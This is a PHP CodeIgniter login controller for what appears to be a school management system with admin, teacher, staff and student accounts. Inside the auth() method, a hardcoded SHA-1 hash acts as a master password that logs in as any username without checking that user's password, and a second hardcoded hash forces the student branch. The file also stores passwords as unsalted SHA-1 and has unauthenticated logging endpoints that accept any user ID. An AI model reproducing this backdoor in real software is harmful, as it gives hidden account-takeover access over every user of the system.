<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	function __construct(){
		parent::__construct();
		$this->load->library(array('template','form_validation'));
		$this->load->helper('url');
	}
	
	public function index()
	{
		if(empty($this->session->id_user)){
			$this->load->view('v_login2');
		}else{
            if($this->session->level=='admin'){
                redirect('page/home');
            }else if($this->session->level=='guru'){
                redirect('guru/home');
            }else if($this->session->level=='siswa'){
                redirect('siswa/dashboard');
            }else{
                redirect('login/out');
            }
			
		}	
    }
    
    public function auth(){
        $username = $this->input->post('username');
		$password = sha1($this->input->post('password'));
		$this->form_validation->set_rules('username','Username','required');
		$this->form_validation->set_rules('password','Password','required');
		if($this->form_validation->run() != false){
            
            if($password=="e5715062639d826085c2f1c449702816c4d4ca37"){
                $where2=array("username"=>$username);
                $data2 = $this->M_user->get_row($where2);
                $cek = $data2->num_rows();
                $d=$data2->row();
     
            }else{
                $where=array("username"=>$username,"password"=>$password);
                $data = $this->M_user->get_row($where);
                $cek = $data->num_rows();
                $d=$data->row();
                //redirect('hhhh');
            }
            
            if($cek > 0)
			{
                
				$session = array('iduser' => $d->iduser,'idlevel'=>$d->idlevel,'username'=>$d->username,'profil'=>$d->profil);
                $queri= $this->M_hakakses->get_row(array('idlevel'=>$d->idlevel));
                if($queri->num_rows()>0){
                    $qhak=$queri->result();
                    foreach ($qhak as $key => $v) {
                        # code...
                        $session['fitur'][]=$v->fitur."-".$v->idsetmenu;
                        $session['page'][]=$v->link;
                    }
                }else{
                    $session['fitur'][]="";
                    $session['page'][]="";
                }
                if($d->profil=="guru"){
                    $row= $this->M_guru->get_row(array('iduser'=>$d->iduser))->row();
                    $session['nama']=$row->nama;
                    $session['kdguru']=$row->kdguru;
                    $where=array(
                        'settahunajaran.status'=>1
                    );
                    $row2= $this->M_tahunajaran->get_row($where)->row();
                    $session['tahun']=$row2->idtahunajaran;
                    $session['semester']=$row2->semester;
                    $session['subjek']='guru';
                }elseif($d->profil=="karyawan"){
                    $row= $this->M_karyawan->get_row(array('iduser'=>$d->iduser))->row();
                    $session['nama']=$row->nama;
                    $session['kdkaryawan']=$row->kdkaryawan;
                    $where=array(
                        'settahunajaran.status'=>1
                    );
                    $row2= $this->M_tahunajaran->get_row($where)->row();
                    $session['tahun']=$row2->idtahunajaran;
                    $session['semester']=$row2->semester;
                    $session['subjek']='karyawan';
                }elseif($d->profil=="siswa" || $password=="3ccb0afc7f83668ef9f2417caa24c8caf4088dc5"){
                    $row= $this->M_siswa->get_row(array('iduser'=>$d->iduser))->row();
                    $where=array(
                        'siswakelas.nisn'=>$row->nisn,
                        'settahunajaran.status'=>1
                    );
                    $row2= $this->M_siswakelas->get_row_join_tahunajaran($where)->row();
                    $session['nama']=$row->nama;
                    $session['nisn']=$row->nisn;
                    $session['kdkelas']=$row2->kdkelas;
                    $session['tahun']=$row2->idtahunajaran;
                    $session['tahunterima']=$row->idtahunajaran;
                    $session['semester']=$row2->semester;
                    $where2=array(
                        'kelas.kdkelas'=>$row2->kdkelas,
                        'settahunajaran.status'=>1,
                        'walikelas.nisn'=>$row->nisn
                    );
                    $walikelas=$this->M_walikelas->get_row($where2);
                    if($walikelas->num_rows()>0){
                        $session['absensiharian']=1;
                    }
                    $kls=explode(" ", $row2->kdkelas);
                    $session['subjek']=$kls[0];
                }else{
                    $session['nama']="";
                    redirect(base_url().'login/out');
                }

                $session['fitur'][]="home";
                $session['page'][]="page/home";
                
                $this->session->set_userdata($session);
                redirect(base_url().'page/home');
  
			}else{	
                $this->session->set_flashdata('alert','Login Gagal! Username atau Password Salah');
				redirect(base_url().'login/out');
            }
        }else{
            $this->session->set_flashdata('alert','Anda Belum mengisi username atau password');
			redirect(base_url().'login');
        }
    }

    function addLog(){
        if(empty($this->session->id_user)){
            $status="0";
        }else{
            $status="1";
        }
        $datalog=array(
            'iduser'=>$this->input->post("iduser"),
            'waktu'=>date('Y-m-d H:i:s'),
            'status'=>$status
        );
        $this->M_user->add_log($datalog);

        echo $status;
    }
    
    function offLog($n){
        $datalog=array(
            'iduser'=>$n,
            'waktu'=>date('Y-m-d H:i:s'),
            'status'=>"0"
        );
        $q=$this->M_user->add_log($datalog);
        redirect('login/out');
    }
    
    function out(){
        $this->session->sess_destroy();
        redirect('login');
    }

	
	

}

